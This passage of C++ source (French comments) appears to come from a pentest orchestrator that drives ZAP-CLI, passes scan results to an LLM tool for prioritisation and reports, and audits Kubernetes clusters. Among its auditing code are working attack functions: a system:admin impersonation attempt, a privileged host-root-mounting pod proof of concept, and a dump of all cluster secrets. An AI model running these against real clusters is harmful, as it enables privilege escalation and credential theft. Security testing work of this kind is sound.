                std::string inside = s.substr(b + 3, e - (b + 3));
                if (!inside.empty() && inside[0] == '\n') inside.erase(0, 1);
                return inside;
            }
        }
        return s;
    };

    std::string shown = extract_text(mcp_raw_out);
    std::cout << "\n\n======= MCP OUTPUT (via mon_prompt.txt + injected alerts_filtered.json) =======\n";
    std::cout << shown << "\n";
    std::cout << "======= END MCP OUTPUT =======\n\n";

    try { fs::remove(tmp_prompt); } catch(...) {}
    return ok;
}

// -----------------------------------------------------------------------------
// call_mcp_analyze : construit un prompt temporaire avec alerts JSON -> JSON urls
// -----------------------------------------------------------------------------
static bool call_mcp_analyze(const fs::path &mcp_path,
                             const fs::path &alerts_json_path,
                             const fs::path &out_urls_json,
                             std::string &mcp_out)
{
    fs::path mcp_log = out_urls_json.parent_path() / "mcp_session.log";
    std::string alerts_content;
    try {
        std::ifstream ifs(alerts_json_path);
        std::ostringstream ss; ss << ifs.rdbuf();
        alerts_content = ss.str();
    } catch (...) {
        logerr("call_mcp_analyze: cannot read " + alerts_json_path.string());
        return false;
    }

    fs::path tmp_prompt = out_urls_json.parent_path() / "mcp_prompt.txt";
    {
        std::ofstream f(tmp_prompt);
        f << "Analyse ce contenu JSON issu de ZAP :\n\n";
        f << "----- BEGIN ALERTS_JSON -----\n";
        f << alerts_content;
        f << "\n----- END ALERTS_JSON -----\n\n";
        f << "Donne une liste priorisée d'URLs à scanner activement avec justification courte.\n";
        f << "Retourne UNIQUEMENT un JSON strict au format :\n";
        f << "{\"urls\":[{\"url\":\"<url>\",\"justification\":\"<texte court>\"}]}\n";
        f.close();
    }

    std::ostringstream cmd;
    cmd << '"' << mcp_path.string() << '"'
        << " --engine web"
        << " --log \"" << mcp_log.string() << "\""
        << " --chat-file \"" << tmp_prompt.string() << "\"";

    std::string o, e;
    bool ok = run_command_capture(cmd.str(), o, e, 180000, false);
    mcp_out = o + "\n" + e;
    if (!ok) {
        logerr("call_mcp_analyze: MCP process failed to start/finish");
        return false;
    }

    auto extract_json = [](const std::string &s) -> std::string {
        size_t b = s.find('{');
        size_t e = s.rfind('}');
        if (b == std::string::npos || e == std::string::npos || e < b) return {};
        return s.substr(b, e - b + 1);
    };

    std::string jtxt = extract_json(mcp_out);
    if (jtxt.empty()) {
        loginfo("MCP did not return JSON, saving raw output instead");
        fs::create_directories(out_urls_json.parent_path());
        std::ofstream ofs(out_urls_json);
        ofs << mcp_out;
        return true;
    }

    try {
        json j = json::parse(jtxt, nullptr, false);
        if (!j.is_discarded() && j.contains("urls") && j["urls"].is_array()) {
            fs::create_directories(out_urls_json.parent_path());
            std::ofstream ofs(out_urls_json);
            ofs << std::setw(2) << j;
            ofs.close();
        } else {
            logerr("MCP returned invalid JSON — saving raw output instead");
            std::ofstream ofs(out_urls_json);
            ofs << mcp_out;
        }
    } catch (const std::exception &ex) {
        logerr(std::string("JSON parse failed: ") + ex.what());
        std::ofstream ofs(out_urls_json);
        ofs << mcp_out;
    }

    return true;
}

// -----------------------------------------------------------------------------
// call_mcp_report_with_files : injecte plusieurs fichiers dans un template MCP
// -----------------------------------------------------------------------------
static bool call_mcp_report_with_files(const fs::path &mcp_path,
                                       const fs::path &exe_parent,
                                       const std::vector<fs::path> &files_to_inject,
                                       const std::string &tpl_name,
                                       std::string &mcp_raw_out,
                                       const fs::path &html_out_path)
{
    fs::path tpl_path = exe_parent / tpl_name;
    if (!fs::exists(tpl_path)) {
        logerr(std::string("call_mcp_report_with_files: template '") + tpl_name + "' not found in " + exe_parent.string());
        return false;
    }

    std::string tpl;
    try {
        std::ifstream ifs(tpl_path.string(), std::ios::in | std::ios::binary);
        std::ostringstream ss; ss << ifs.rdbuf();
        tpl = ss.str();
    } catch(...) {
        logerr("call_mcp_report_with_files: failed to read template");
        return false;
    }

    std::ostringstream injected;
    injected << "\n\n----- BEGIN INJECTED REPORT FILES -----\n";
    for (const auto &f : files_to_inject) {
        injected << "\n\n----- BEGIN FILE: " << f.filename().string() << " (path: " << f.string() << ") -----\n";
        std::string content;
        try {
            std::ifstream ifs(f.string(), std::ios::in | std::ios::binary);
            std::ostringstream ss; ss << ifs.rdbuf(); content = ss.str();
        } catch(...) {
            content = std::string("<< failed to read file: ") + f.string() + " >>\n";
        }
        injected << content << "\n";
        injected << "----- END FILE: " << f.filename().string() << " -----\n";
    }
    injected << "\n----- END INJECTED REPORT FILES -----\n\n";

    std::string final_prompt = tpl;
    const std::string placeholder = "{{REPORT_FILES}}";
    size_t pos = final_prompt.find(placeholder);
    if (pos != std::string::npos) final_prompt.replace(pos, placeholder.length(), injected.str());
    else final_prompt += "\n\n" + injected.str();

    fs::path tmp_prompt = exe_parent / "mcp_report_tmp_prompt.txt";
    try {
        std::ofstream ofs(tmp_prompt, std::ios::binary);
        ofs << final_prompt;
        ofs.close();
    } catch (const std::exception &ex) {
        logerr(std::string("call_mcp_report_with_files: failed to write tmp prompt: ") + ex.what());
        return false;
    }

    fs::path mcp_log = exe_parent / "mcp_report_session.log";
    std::ostringstream cmd;
    cmd << '"' << mcp_path.string() << '"'
        << " --engine web"
        << " --log \"" << mcp_log.string() << "\""
        << " --chat-file \"" << tmp_prompt.string() << "\"";

    std::string out, err;
    bool ok = run_command_capture(cmd.str(), out, err, 240000, false);
    mcp_raw_out = out + "\n" + err;
    if (!ok) logerr("call_mcp_report_with_files: MCP process failed (see " + mcp_log.string() + ")");

    if (!html_out_path.empty()) {
        try {
            fs::create_directories(html_out_path.parent_path());
            std::ofstream ofs(html_out_path, std::ios::binary);
            ofs << mcp_raw_out; // Écrit l'output tel quel (HTML attendu par le template)
            ofs.close();
        } catch (const std::exception &ex) {
            logerr(std::string("Failed to write HTML report: ") + ex.what());
            try { fs::remove(tmp_prompt); } catch(...) {}
            return false;
        }
        try { fs::remove(tmp_prompt); } catch(...) {}
        return ok;
    }

    // --- OPTION B: concatène uniquement les blocs ```...``` ; fallback => tout ---
    auto extract_all_codeblocks_or_all = [](const std::string &s)->std::string {
        std::string out;
        size_t pos = 0;
        bool any = false;
        while (true) {
            size_t b = s.find("```", pos);
            if (b == std::string::npos) break;
            size_t e = s.find("```", b + 3);
            if (e == std::string::npos) break;
            std::string block = s.substr(b + 3, e - (b + 3));
            if (!block.empty() && block[0] == '\n') block.erase(0,1);
            out += block;
            if (out.empty() || out.back() != '\n') out += "\n";
            pos = e + 3;
            any = true;
        }
        return any ? out : s;
    };

    std::string shown = extract_all_codeblocks_or_all(mcp_raw_out);
    std::cout << "\n\n======= REPORT OUTPUT =======\n";
    std::cout << shown << "\n";
    std::cout << "======= REPORT OUTPUT =======\n\n";

    try { fs::remove(tmp_prompt); } catch(...) {}
    return ok;
}

// -----------------------------------------------------------------------------
// run_zapcli : lance ZAP-CLI avec action, capte stdout/stderr (x-plat)
// -----------------------------------------------------------------------------
static bool run_zapcli(const std::string &zapcli_path,
                       const std::string &host, uint16_t port, const std::string &apikey,
                       const std::string &baseurl, const std::string &action,
                       const fs::path &outdir,
                       std::string &stdout_out, std::string &stderr_out)
{
    std::ostringstream cmd;
    cmd << '"' << zapcli_path << '"'
        << " --host " << host
        << " --port " << port;
    if (!apikey.empty()) cmd << " --apikey \"" << apikey << '"';
    if (!baseurl.empty()) cmd << " --baseurl \"" << baseurl << '"';
    if (!action.empty()) cmd << " --action " << action;
    if (!outdir.empty()) cmd << " --outdir \"" << outdir.string() << '"';

    std::string out, err;
    bool ok = run_command_capture(cmd.str(), out, err, 0, false); // pas d'écriture console
    stdout_out = out;
    stderr_out = err;
    if (!ok) logerr("run_zapcli failed to launch: " + cmd.str());
    return ok;
}

// -----------------------------------------------------------------------------
// Structures & helpers additionnels (inchangés côté logique)
// -----------------------------------------------------------------------------
struct AgentOptions {
    std::string host="localhost";
    uint16_t port=8888;
    std::string apikey;
    std::string baseurl;
    fs::path outdir="zap_cli_out";
    fs::path mcp_path;
    std::string zapcli_path = "ZAP-CLI"; // cross-platform défaut : sans extension
    bool wait_browse=false;
};

// Trouver dernier fichier avec préfixe (non-recursif)
static fs::path find_latest_file_with_prefix(const fs::path &workdir, const std::string &prefix) {
    fs::path latest;
    fs::file_time_type latest_time;
    bool found = false;
    try {
        for (auto &p : fs::directory_iterator(workdir)) {
            if (!p.is_regular_file()) continue;
            std::string fname = p.path().filename().string();
            if (fname.rfind(prefix, 0) == 0) {
                fs::file_time_type t = fs::last_write_time(p.path());
                if (!found || t > latest_time) {
                    latest_time = t;
                    latest = p.path();
                    found = true;
                }
            }
        }
    } catch (const std::exception &ex) {
        logerr(std::string("find_latest_file_with_prefix: error scanning ") + workdir.string() + " : " + ex.what());
    }
    return latest;
}

// Trouver les fichiers active_alerts_*.json (non-recursif) — tri lexicographique
static std::vector<fs::path> find_message_files(const fs::path &workdir) {
    std::vector<fs::path> out;
    try {
        for (auto &p : fs::directory_iterator(workdir)) {
            if (!p.is_regular_file()) continue;
            std::string fname = p.path().filename().string();
            if (fname.rfind("active_alerts_", 0) == 0 && p.path().extension() == ".json") {
                out.push_back(p.path());
            }
        }
        std::sort(out.begin(), out.end(), [](const fs::path &a, const fs::path &b){
            return a.filename().string() < b.filename().string();
        });
    } catch (const std::exception &ex) {
        logerr(std::string("find_message_files: error scanning ") + workdir.string() + " : " + ex.what());
    }
    return out;
}

static void print_compact_alerts_summary(const json &alerts_json, const fs::path &workdir) {
    int informational = 0, low = 0, medium = 0, high = 0;
    if (alerts_json.contains("alerts") && alerts_json["alerts"].is_array()) {
        for (const auto &a : alerts_json["alerts"]) {
            std::string r = a.value("risk", "");
            if (r == "Informational") informational++;
            else if (r == "Low") low++;
            else if (r == "Medium") medium++;
            else if (r == "High") high++;
        }
    }

    std::cout << ansi::green << "[+] Generate scan session..." << ansi::reset << std::endl;

    const int w1 = 15, w2 = 7, w3 = 8, w4 = 7;
    const int inner = w1 + w2 + w3 + w4 + 11;

    auto B = [](){ return ansi::blue;  };
    auto W = [](){ return ansi::white; };
    auto R = [](){ return ansi::reset; };

    // top border
    std::cout << B() << u8"┌" << utf8_repeat(u8"─", inner) << u8"┐" << R() << "\n";

    // title
    const std::string title_s = " Alerts summary";
    const int title_pad = inner - static_cast<int>(title_s.size());
    std::cout << B() << u8"│ " << W() << title_s << std::string(title_pad - 1, ' ')
              << B() << u8"│" << R() << "\n";

    // separator
    std::cout << B() << u8"├" << utf8_repeat(u8"─", w1+2) << u8"┬"
              << utf8_repeat(u8"─", w2+2) << u8"┬"
              << utf8_repeat(u8"─", w3+2) << u8"┬"
              << utf8_repeat(u8"─", w4+2) << u8"┤" << R() << "\n";

    auto pad_center = [](const std::string &s, int w)->std::string {
        if ((int)s.size() >= w) return s.substr(0, w);
        int left  = (w - (int)s.size()) / 2;
        int right = w - (int)s.size() - left;
        return std::string(left, ' ') + s + std::string(right, ' ');
    };

    // header row
    std::cout << B() << u8"│ " << W() << pad_center("Informational", w1)
              << B() << u8" │ " << ansi::yellow << pad_center("Low", w2) << R()
              << B() << u8" │ " << ansi::orange << pad_center("Medium", w3) << R()
              << B() << u8" │ " << ansi::red << pad_center("High", w4) << R()
              << B() << u8" │" << R() << "\n";

    // separator
    std::cout << B() << u8"├" << utf8_repeat(u8"─", w1+2) << u8"┼"
              << utf8_repeat(u8"─", w2+2) << u8"┼"
              << utf8_repeat(u8"─", w3+2) << u8"┼"
              << utf8_repeat(u8"─", w4+2) << u8"┤" << R() << "\n";

    auto pad_right = [](const std::string &s, int w)->std::string {
        if ((int)s.size() >= w) return s.substr(0, w);
        return s + std::string(w - (int)s.size(), ' ');
    };

    // values row
    std::cout << B() << u8"│ " << W() << pad_right(std::to_string(informational), w1)
              << B() << u8" │ " << ansi::yellow << pad_right(std::to_string(low), w2) << R()
              << B() << u8" │ " << ansi::orange << pad_right(std::to_string(medium), w3) << R()
              << B() << u8" │ " << ansi::red << pad_right(std::to_string(high), w4) << R()
              << B() << u8" │" << R() << "\n";

    // bottom border
    std::cout << B() << u8"└" << utf8_repeat(u8"─", w1+2) << u8"┴"
              << utf8_repeat(u8"─", w2+2) << u8"┴"
              << utf8_repeat(u8"─", w3+2) << u8"┴"
              << utf8_repeat(u8"─", w4+2) << u8"┘" << R() << "\n";

    // messages finaux
    std::cout << ansi::green << "[+] All done. Output directory: "
              << ansi::white << workdir.string()
              << ansi::reset << std::endl;

    std::cout << ansi::green << "[+] Strategy report generation..."
              << ansi::reset << std::endl;
}

// -----------------------------------------------------------------------------
// K8s helpers (cross-platform)
// -----------------------------------------------------------------------------
static std::string g_kubecontext;  // optionnel
static std::string g_kubeconfig;   // optionnel
static fs::path    g_kube_dir="kube";

// ===== Katana global state (piloté par main() / CLI) =====
static bool g_use_katana = false;                         // --katana
static std::string g_katana_bin_explicit;                 // --katana-bin <path>
static std::vector<std::string> g_katana_passthrough;     // tout ce qui suit -- (pass-through)


static std::string quote(const std::string& s){
    std::ostringstream o; o << '"' << s << '"'; return o.str();
}
static std::string join_cmd(const std::string& exe, const std::vector<std::string>& args){
    std::ostringstream cmd; cmd << exe;
    for (auto& a: args) { cmd << ' ' << a; }
    return cmd.str();
}

// Résout un binaire local si présent :
// - Windows: teste "name.exe" dans g_kube_dir, sinon "name" via PATH
// - POSIX: teste "name" dans g_kube_dir, sinon "name" via PATH
// Avant : resolve_cmd renvoyait un chemin déjà entre guillemets -> à éviter
// Après : renvoie toujours un chemin SANS guillemets
static std::string resolve_cmd(const std::string& prefer_basename, const std::string& fallback_name){
#ifdef _WIN32
    fs::path p1 = g_kube_dir / (prefer_basename + ".exe");
    if (fs::exists(p1)) return p1.string();
    fs::path p2 = g_kube_dir / prefer_basename;
    if (fs::exists(p2)) return p2.string();
    return fallback_name; // via PATH
#else
    fs::path p1 = g_kube_dir / prefer_basename;
    if (fs::exists(p1)) return p1.string();
    return fallback_name; // via PATH
#endif
}

// collecte récursive de fichiers
static std::vector<fs::path> collect_all_files_recursive(const fs::path& root){
    std::vector<fs::path> out;
    try{
        if (!fs::exists(root)) return out;
        for (auto &p : fs::recursive_directory_iterator(root)){
            if (p.is_regular_file()) out.push_back(p.path());
        }
    }catch(...){}
    return out;
}

static bool run_k8s_tool(const std::string& exeName,
                         const std::vector<std::string>& args,
                         const fs::path& out,
                         std::string& out_stdout,
                         std::string& out_stderr)
{
    std::string exeFull;

    fs::path p = exeName;               // exeName NE DOIT PAS contenir de guillemets
    if (p.has_parent_path()) {
        // Appel avec un chemin (ex: ".\\kube\\kubescape.exe")
        exeFull = p.string();
    } else {
#ifdef _WIN32
        fs::path local = g_kube_dir / (exeName + ".exe");
        if (fs::exists(local)) exeFull = local.string();
        else {
            fs::path local2 = g_kube_dir / exeName;
            exeFull = fs::exists(local2) ? local2.string() : exeName; // PATH
        }
#else
        fs::path local = g_kube_dir / exeName;
        exeFull = fs::exists(local) ? local.string() : exeName;       // PATH
#endif
    }

    // Construit la ligne de commande avec UN SEUL quoting de l'exécutable
    std::string cmd = quote(exeFull);
    for (auto &a : args) cmd += " " + a;     // tes args sont déjà safe/quotés au besoin

    std::string so, se;
    bool ok = run_command_capture(cmd, so, se, 0, false);
    out_stdout = so; out_stderr = se;

    try{
        fs::create_directories(out.parent_path());
        std::ofstream ofs(out, std::ios::binary);
        ofs << so;
    }catch(...){}

    if(!ok) logerr("run_k8s_tool failed: " + cmd + "\n" + se);
    return ok;
}

// 2) run_kubectl_json: force -o json
static bool run_kubectl_json(const std::vector<std::string>& kargs, const fs::path& out_json)
{
    const std::string kubectl = resolve_cmd("kubectl", "kubectl");

    std::vector<std::string> args;
    if(!g_kubecontext.empty()){ args.push_back("--context"); args.push_back(g_kubecontext); }
    if(!g_kubeconfig.empty()){ args.push_back("--kubeconfig"); args.push_back(quote(g_kubeconfig)); }

    for(auto &a: kargs) args.push_back(a);

    bool has_o=false;
    for(size_t i=0;i+1<args.size();++i){
        if(args[i]=="-o" && args[i+1]=="json"){ has_o=true; break; }
    }
    if(!has_o){ args.push_back("-o"); args.push_back("json"); }

    std::string cmd = kubectl;
    for(auto &a: args) cmd += " " + a;

    std::string so,se;
    bool ok = run_command_capture(cmd, so, se, 0, false);

    try{
        fs::create_directories(out_json.parent_path());
        std::ofstream ofs(out_json, std::ios::binary); ofs<<so; ofs.close();
    }catch(...){}

    if(!ok) logerr("kubectl failed: " + cmd + "\n" + se);
    return ok;
}

// -- 1) Test d'impersonation : tente une requête avec --as=system:admin
static bool k8s_try_impersonation(const fs::path& out_file){
    const std::string kubectl = resolve_cmd("kubectl", "kubectl");

    auto run = [&](const std::vector<std::string>& args, std::string& so, std::string& se)->bool{
        std::ostringstream cmd; cmd << kubectl;
        if(!g_kubecontext.empty()) cmd << " --context " << g_kubecontext;
        if(!g_kubeconfig.empty())  cmd << " --kubeconfig " << '"' << g_kubeconfig << '"';
        for (auto& a: args) cmd << " " << a;
        return run_command_capture(cmd.str(), so, se, 0, false);
    };

    std::string so,se;
    bool ok = run({"--as=system:admin","get","pods","-A","-o","wide"}, so, se);

    std::ofstream ofs(out_file, std::ios::binary);
    ofs << "CMD: kubectl --as=system:admin get pods -A -o wide\n\n";
    ofs << "STDOUT:\n" << so << "\n\nSTDERR:\n" << se << "\n";
    ofs << "\nRESULT: " << (ok && se.find("forbidden") == std::string::npos ? "LIKELY VULNERABLE (impersonation worked)" : "blocked") << "\n";
    return ok;
}

// -- 2) Création d’un pod privilégié (POC)
static bool k8s_try_privileged_pod(const fs::path& wd, const std::string& ns, const std::string& name){
    fs::path yaml = wd/(name + ".yaml");
    const char* Y =
R"(apiVersion: v1
kind: Pod
metadata:
  name: PNAME
  namespace: PNS
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: privesc
    image: alpine:3.19
    securityContext:
      privileged: true
    command: ["sh","-c","id; uname -a; sleep 3600"]
    volumeMounts:
    - name: root
      mountPath: /hostroot
      readOnly: true
  volumes:
  - name: root
    hostPath:
      path: /
      type: Directory
)";
    std::string y(Y);
    auto rep=[&](const std::string& k,const std::string& v){
        size_t p=0; while((p=y.find(k,p))!=std::string::npos){ y.replace(p,k.size(),v); p+=v.size(); }
    };
    rep("PNAME", name);
    rep("PNS",   ns);
    try { std::ofstream f(yaml); f<<y; } catch(...) {}

    const std::string kubectl = resolve_cmd("kubectl", "kubectl");
    auto run = [&](const std::vector<std::string>& args, std::string& so, std::string& se)->bool{
        std::ostringstream cmd; cmd << kubectl;
        if(!g_kubecontext.empty()) cmd << " --context " << g_kubecontext;
        if(!g_kubeconfig.empty())  cmd << " --kubeconfig " << '"' << g_kubeconfig << '"';
        for (auto& a: args) cmd << " " << a;
        return run_command_capture(cmd.str(), so, se, 0, false);
    };

    std::string so,se, logs;

    // create ns (idempotent)
    run({"create","ns",ns,"--dry-run=client","-o","yaml"}, so, se);
    run({"apply","-f", quote(yaml.string())}, so, se);

    // wait Ready
    run({"wait","--for=condition=Ready","pod/"+name,"-n",ns,"--timeout=120s"}, so, se);

    // logs preuve
    run({"logs","-n",ns,name}, logs, se);

    std::ofstream pf(wd/(name + "_result.txt"), std::ios::binary);
    pf << "APPLY/WAIT STDERR:\n" << se << "\n\nLOGS:\n" << logs << "\n";
    pf.close();

    // cleanup
    run({"delete","pod",name,"-n",ns,"--ignore-not-found=true"}, so, se);
    return true;
}

// -- 3) Exfil secrets (si autorisé) : liste + dump
static bool k8s_dump_secrets(const fs::path& wd){
    run_kubectl_json({"get","secrets","-A"}, wd/"k8s_secrets_list.json");

    const std::string kubectl = resolve_cmd("kubectl", "kubectl");
    std::string so,se;
    std::ostringstream cmd;
    cmd << kubectl;
    if(!g_kubecontext.empty()) cmd << " --context " << g_kubecontext;
    if(!g_kubeconfig.empty())  cmd << " --kubeconfig " << '"' << g_kubeconfig << '"';
    cmd << " get secrets -A -o yaml";
    run_command_capture(cmd.str(), so, se, 0, false);

    std::ofstream ofs(wd/"k8s_secrets_dump.yaml", std::ios::binary);
    ofs << so << "\n\n# STDERR\n" << se << "\n";
    return true;
}

// 3) run_kubectl_job_logs: apply job, attendre completion, récupérer logs
static bool run_kubectl_job_logs(const fs::path& jobYaml,
                          const std::string& ns,
                          const std::string& jobName,
                          const fs::path& out_file)
{
    const std::string kubectl = resolve_cmd("kubectl", "kubectl");

    auto kubecmd = [&](std::vector<std::string> extra, std::string &so, std::string &se)->bool{
        std::ostringstream cmd; cmd << kubectl;
        if(!g_kubecontext.empty()) cmd << " --context " << g_kubecontext;
        if(!g_kubeconfig.empty())  cmd << " --kubeconfig " << quote(g_kubeconfig);
        for(auto &a: extra) cmd << " " << a;
        return run_command_capture(cmd.str(), so, se, 0, false);
    };

    std::string so,se;

    // apply -f
    if(!kubecmd({"apply","-n",ns,"-f",quote(jobYaml.string())}, so, se)){
        logerr(se); return false;
    }

    // wait complete
    if(!kubecmd({"wait","-n",ns,"--for=condition=complete","job/"+jobName,"--timeout=300s"}, so, se)){
        logerr("job wait failed: "+se);
    }

    // pod name
    bool got=false; std::string podName;
    if(kubecmd({"get","pods","-n",ns,"-l","job-name="+jobName,"-o","jsonpath={.items[0].metadata.name}"}, so, se)){
        podName = so;
        got = !podName.empty();
    }

    // logs
    std::string logs;
    if(got){
        kubecmd({"logs","-n",ns,podName}, logs, se);
    }else{
        kubecmd({"logs","-n",ns,"job/"+jobName}, logs, se);
    }

    try{
        fs::create_directories(out_file.parent_path());
        std::ofstream ofs(out_file, std::ios::binary); ofs<<logs; ofs.close();
    }catch(...){}

    // cleanup
    kubecmd({"delete","job",jobName,"-n",ns}, so, se);
    return true;
}

// Crée namespace kube-bench puis l'applique
static void k8s_prepare_kube_bench_namespace(const fs::path& wd){
    const std::string kubectl = resolve_cmd("kubectl", "kubectl");
    std::string so, se;

    std::ostringstream cmd1;
    cmd1 << kubectl;
    if(!g_kubecontext.empty()) cmd1 << " --context " << g_kubecontext;
    if(!g_kubeconfig.empty())  cmd1 << " --kubeconfig " << '"' << g_kubeconfig << '"';
    cmd1 << " create ns kube-bench --dry-run=client -o yaml";
    run_command_capture(cmd1.str(), so, se, 0, false);

    fs::path nsFile = wd / "ns_kube-bench.yaml";
    try { std::ofstream f(nsFile); f << so; } catch(...) {}
    std::ostringstream cmd2;
    cmd2 << kubectl;
    if(!g_kubecontext.empty()) cmd2 << " --context " << g_kubecontext;
    if(!g_kubeconfig.empty())  cmd2 << " --kubeconfig " << '"' << g_kubeconfig << '"';
    cmd2 << " apply -f " << '"' << nsFile.string() << '"';
    run_command_capture(cmd2.str(), so, se, 0, false);
}

// Construit le Job kube-bench et récupère logs JSON
static void k8s_run_kube_bench_job(const fs::path& wd){
    fs::path jobY = wd / "job-kube-bench.yaml";
    const char* JOB =
R"(apiVersion: batch/v1
kind: Job
metadata:
  name: kube-bench
  namespace: kube-bench
spec:
  template:
    spec:
      hostPID: true
      containers:
      - name: kube-bench
        image: aquasec/kube-bench:latest
        command: ["kube-bench","--json"]
        volumeMounts:
        - name: var-lib-etcd
          mountPath: /var/lib/etcd
        - name: var-lib-kubelet
          mountPath: /var/lib/kubelet
        - name: etc-systemd
          mountPath: /etc/systemd
        - name: etc-kubernetes
          mountPath: /etc/kubernetes
      restartPolicy: Never
      volumes:
      - name: var-lib-etcd
        hostPath: { path: /var/lib/etcd }
      - name: var-lib-kubelet
        hostPath: { path: /var/lib/kubelet }
      - name: etc-systemd
        hostPath: { path: /etc/systemd }
      - name: etc-kubernetes
        hostPath: { path: /etc/kubernetes }
  backoffLimit: 0
)";
    try { std::ofstream f(jobY); f << JOB; } catch(...) {}
    run_kubectl_job_logs(jobY, "kube-bench", "kube-bench", wd / "k8s_kube_bench.json");
}

// --- Findings K8s (cross-platform, sans jq) -------------------------------
static json filter_findings_from_inventory(const json& inv) {
    // Namespaces système à ignorer
    std::regex noise_ns(
        R"(^(kube-|openshift-|istio-system$|linkerd$|cilium$|tigera-operator$|calico-system$))",
        std::regex::icase
    );
    auto is_noise = [&](const std::string& ns){ return std::regex_search(ns, noise_ns); };

    auto extract_podspec = [](const json& obj)->json {
        if (obj.value("kind", "") == "Pod" && obj.contains("spec")) return obj["spec"];
        if (obj.contains("spec") && obj["spec"].contains("template") && obj["spec"]["template"].contains("spec"))
            return obj["spec"]["template"]["spec"];
        return json(); // null
    };

    json findings = json::array();

    for (const auto& obj : inv.value("items", json::array())) {
        std::string kind = obj.value("kind", "");
        std::string ns   = obj["metadata"].value("namespace", "");
        std::string name = obj["metadata"].value("name", "");
        if (ns.empty() || is_noise(ns)) continue;

        // Service exposé en NodePort
        if (kind == "Service" && obj.contains("spec") && obj["spec"].value("type","") == "NodePort") {
            json f; f["kind"]=kind; f["namespace"]=ns; f["name"]=name;
            f["issues"] = json::array({ {{"id","service_nodeport_exposed"},{"ports", obj["spec"]["ports"]}} });
            findings.push_back(std::move(f));
            continue;
        }

        // Pod/Controller
        json ps = extract_podspec(obj);
        if (ps.is_null()) continue;

        json issues = json::array();
        if (ps.value("hostNetwork", false)) issues.push_back({{"id","hostnetwork_true"}});
        if (ps.value("hostPID",     false)) issues.push_back({{"id","hostpid_true"}});
        if (ps.value("hostIPC",     false)) issues.push_back({{"id","hostipc_true"}});

        if (ps.contains("volumes") && ps["volumes"].is_array()) {
            for (const auto& v : ps["volumes"]) {
                if (v.contains("hostPath")) {
                    issues.push_back({
                        {"id","hostpath_volume"},
                        {"volume", v.value("name","")},
                        {"path",   v["hostPath"].value("path","")},
                        {"type",   v["hostPath"].value("type","")}
                    });
                }
            }
        }

        auto scan_containers = [&](const json& arr){
            if (!arr.is_array()) return;
            for (const auto& c : arr) {
                std::string cname = c.value("name","");
                const auto& sc = c.value("securityContext", json::object());
                if (sc.value("privileged", false))
                    issues.push_back({{"id","privileged_container"},{"container",cname}});
                if (sc.value("allowPrivilegeEscalation", false))
                    issues.push_back({{"id","allow_privilege_escalation_true"},{"container",cname}});
                if (sc.contains("runAsUser") && sc.value("runAsUser", 1) == 0)
                    issues.push_back({{"id","run_as_root_uid0"},{"container",cname}});
                if (sc.contains("runAsNonRoot") && sc.value("runAsNonRoot", true) == false)
                    issues.push_back({{"id","run_as_non_root_false"},{"container",cname}});

                std::string img = c.value("image","");
                bool latest_or_missing = false;
                if (!img.empty()) {
                    auto pos = img.rfind(':');
                    latest_or_missing = (pos == std::string::npos) || (img.substr(pos+1) == "latest");
                }
                if (latest_or_missing)
                    issues.push_back({{"id","image_tag_latest_or_missing"},{"container",cname},{"image",img}});

                if (c.contains("ports") && c["ports"].is_array()) {
                    for (const auto& prt : c["ports"]) {
                        if (prt.contains("hostPort"))
                            issues.push_back({{"id","host_port_exposed"},{"container",cname},
                                              {"hostPort", prt.value("hostPort",0)},
                                              {"containerPort", prt.value("containerPort",0)}});
                    }
                }
            }
        };
        scan_containers(ps.value("containers", json::array()));
        scan_containers(ps.value("initContainers", json::array()));
        scan_containers(ps.value("ephemeralContainers", json::array()));

        if (!issues.empty()) {
            json f; f["kind"]=kind; f["namespace"]=ns; f["name"]=name; f["issues"]=issues;
            findings.push_back(std::move(f));
        }
    }

    // summary
    std::map<std::string,int> counts;
    for (const auto& f : findings) {
        for (const auto& it : f.value("issues", json::array()))
            counts[it.value("id","")]++;
    }
    json summary = json::object();
    for (auto& kv : counts) summary[kv.first] = kv.second;

    return json{{"summary", summary}, {"findings", findings}};
}

static bool generate_findings_only(const fs::path& wd, fs::path& out_findings_json) {
    // 1) inventaire minimal (évite cluster-info dump)
    fs::path inv_min = wd / "k8s_inv_min.json";
    if (!run_kubectl_json({"get","pods,deploy,ds,sts,cronjob,svc","-A"}, inv_min)) {
        logerr("kubectl inventory (minimal) failed");
        return false;
    }

    // 2) charge + filtre
    json inv;
    try { inv = json::parse(readFile(inv_min.string())); }
    catch (const std::exception& ex) {
        logerr(std::string("parse inv_min failed: ") + ex.what());
        return false;
    }
    json out = filter_findings_from_inventory(inv);

    // 3) sauvegarde
    out_findings_json = wd / "k8s_inventory_findings.json";
    try { std::ofstream ofs(out_findings_json); ofs << std::setw(2) << out; }
    catch (...) { logerr("write findings failed"); return false; }

    // 4) petit récap console
    std::vector<std::pair<std::string,std::string>> rows;
    rows.emplace_back("K8S findings JSON", out_findings_json.string());
    if (out.contains("summary")) {
        int total = 0;
        for (auto it = out["summary"].begin(); it != out["summary"].end(); ++it) total += it.value().get<int>();
        rows.emplace_back("Findings count", std::to_string(total));
    }
    print_kv_table(rows, {"K8S findings JSON","Findings count"});
    return true;
}

// Orchestrateur K8s
static bool run_agentfactory_k8s(const AgentOptions& opt){
    print_dark_moon();
    std::cout << ansi::green << "[K8S] Start pentest (cluster+RBAC)" << ansi::reset << std::endl;

    // --- Workdir
    const std::string hostpart = extract_hostname(opt.baseurl.empty() ? "k8s" : opt.baseurl);
    const std::string ts = current_datetime_string();
    fs::path wd = fs::path(opt.outdir) / (std::string("k8s_") + hostpart + "_" + ts);
    try { fs::create_directories(wd); } catch(...) {}

    // Détecte binaires optionnels
    const std::string exe_kubectl     = resolve_cmd("kubectl", "kubectl");
    const std::string exe_kubescape   = resolve_cmd("kubescape", "kubescape");
    const std::string exe_rbac_police = resolve_cmd("rbac-police", "rbac-police");
    const std::string exe_whocan      = resolve_cmd("kubectl-who-can", "kubectl-who-can");
#ifdef _WIN32
    // kubeletctl Windows peut avoir un binaire spécifique
    const std::string exe_kubeletctl  = resolve_cmd("kubeletctl_windows_386", "kubeletctl_windows_386.exe");
#else
    const std::string exe_kubeletctl  = resolve_cmd("kubeletctl", "kubeletctl");
#endif

    // ===== A — Recon kubelet =====
    {
        std::string out, err;
        if (exe_kubeletctl != "kubeletctl" && exe_kubeletctl != "kubeletctl_windows_386.exe") {
            run_k8s_tool(exe_kubeletctl, {"scan", opt.host}, wd / "k8s_kubelet_findings.txt", out, err);
        } else {
            // tentative via PATH
            run_k8s_tool(exe_kubeletctl, {"scan", opt.host}, wd / "k8s_kubelet_findings.txt", out, err);
        }
    }

